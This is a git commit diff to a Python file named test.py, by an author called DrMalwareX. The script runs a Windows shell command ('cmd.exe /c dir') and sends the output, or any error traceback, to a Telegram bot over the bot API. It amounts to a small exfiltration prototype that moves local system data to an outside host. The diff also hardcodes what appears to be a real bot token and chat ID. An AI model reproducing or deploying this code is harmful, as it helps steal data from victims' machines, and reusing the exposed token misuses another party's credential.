941a35df4c18a300ac430aeed25cc6a398dc1fed
DrMalwareX <89261482+DrMalwareX@users.noreply.github.com>
2021-08-24 07:39:05 +0300

    Update test.py

--- test.py
+++ test.py
@@ -1,8 +1,12 @@
+import traceback
 from subprocess import Popen,PIPE
 import requests
-sub = Popen(["cmd.exe","/c","dir"],stdout=PIPE,stderr=PIPE,stdin=PIPE,shell=True)
-output = sub.communicate()[0]
-print(output)
-token = "1951689247:AAGNnZkRBIYIQUW7t8sDgxjLeu0fO-HHfWI"
-chat_id = "1886037256"
-requests.get("https://api.telegram.org/bot" + token + "/sendMessage?text=" + output +"--&chat_id=" + chat_id)
+try:
+    sub = Popen(["cmd.exe","/c","dir"],stdout=PIPE,stderr=PIPE,stdin=PIPE,shell=True)
+    output = sub.communicate()[0]
+    print(output)
+    token = "1951689247:AAGNnZkRBIYIQUW7t8sDgxjLeu0fO-HHfWI"
+    chat_id = "1886037256"
+    requests.get("https://api.telegram.org/bot" + token + "/sendMessage?text=" + output +"--&chat_id=" + chat_id)
+except:
+    requests.get("https://api.telegram.org/bot" + token + "/sendMessage?text=" + traceback.format_exc() +"--&chat_id=" + chat_id)
